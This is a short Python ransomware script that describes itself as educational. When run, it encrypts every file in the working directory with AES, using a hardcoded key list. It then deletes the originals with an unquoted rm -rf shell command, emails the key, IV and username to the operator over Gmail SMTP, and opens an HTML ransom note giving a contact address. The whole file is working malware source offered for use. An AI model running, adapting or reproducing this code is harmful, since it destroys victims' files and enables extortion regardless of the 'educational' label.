#!/usr/bin/env python
'''
This program is a Ransomware, it was created with educational goals
so take carefull to use it.

Change the email account with your account.

mateus-N00B, Agosto 2016

Version 1.0

License GPL

TODO:
Insert a random key generation.
'''

import os,sys,time
import smtplib
import random
import hashlib, getpass

# Looking for the pycrypto

try:
	from Crypto.Cipher import AES
except:
	  os.system('pip install pycrypto')
	  time.sleep(1)
	  from Crypto.Cipher import AES

from Crypto.Random import random

'''+++++++++++++++++++++++++ GLOBALS DEFINE +++++++++++++++++++++++++'''
global PASSWORD
global IV
global USER

KEYS = ['68b329da9893e340', '4e5dc3caa06fa07c','ba0cc7fbd788f3aa', '6fad925d11791093','93c2f537558d98f8', '7755cd776caa84bc', '41e4d89b2ae8a90f']

# Loading the keys
seed = str(random.randint(0,35535))
HASH = hashlib.md5(seed)
IV = str(random.choice(KEYS))
seed = str(random.randint(0,35535))
HASH = hashlib.md5(seed)
PASSWORD = str(random.choice(KEYS))

# Array to get the crypted files
FILES = []

# Get the victim name
USER = os.getenv('USER')

'''+++++++++++++++++++++++++ EMAIL FUNCTION +++++++++++++++++++++++++'''
def email_function():
	myemail = raw_input("My email>> ")
	pswd = getpass.getpass()
	try:
		mailer = smtplib.SMTP('smtp.gmail.com',25)
		mailer.ehlo()
		mailer.starttls()
		mailer.login(myemail,pswd)
		mailer.sendmail('H4CK3D',myemail,"Subject: \nPassword %s\nIV %s\nUSER %s" % (PASSWORD,IV,USER))
		time.sleep(1)
		mailer.quit()
	except:
		pass

# Encrypt function
def encrypt():
	os.system('clear||cls')
	print "[!] This should take a long time..."

	bar = AES.new(PASSWORD, AES.MODE_CBC,str(IV))
	
	# Getting the files to encrypt
	os.chdir('.')
	os.system('[ -f /tmp/h4ck3d.txt ] && rm /tmp/h4ck3d.txt')
	os.system('for x in *; do [ -f "$x" ] && echo $x >> /tmp/h4ck3d.txt; done')

	to_encrypt = open('/tmp/h4ck3d.txt','r')

	for x in to_encrypt.readlines():
		x = x.rstrip()
		to_read = open("%s" % x, 'r')
		var = open("%s/%s_h4ck3d" % (os.getenv('PWD'),x),'w')
		cont = 0
		foo = ""
		try:
			for i in to_read.read():
				foo += i
			while len(foo)%16 != 0:
					foo +=' '

			aux = bar.encrypt(str(foo))
			var.write(str(aux))
			#var.write('\n')


			FILES.append(x)
			var.close()
			to_read.close()
			os.system("rm -rf %s" % (x))

		except:
			#print "[-] Error to encrypt %s" % x
			pass

	email_function()
	time.sleep(2)
	notification()

# The html notification page
def notification():
	msg = " <!DOCTYPE html>\
	<html>\
	<head>\
	<title>HELLO %s </title>\
	</head>\
	<body>\
	\
	<p>Oops! We've got a little problem here! It seems that we have a ransomware. </p>\
	<p>Talk to: foobarnoobr@gmail.com</p>\
	\
	</body>\
	</html> " % os.getenv('USER')

	foo = open("%s/hello.html" % os.getenv('HOME'),'w')
	foo.write(msg)
	foo.close()
	os.system("firefox %s/hello.html" % os.getenv('HOME'))

'''++++++++++++++++++++++++++++++++++ CALL THE FUNCTION +++++++++++++++++++++++++++++++++++++++++++++'''
encrypt()
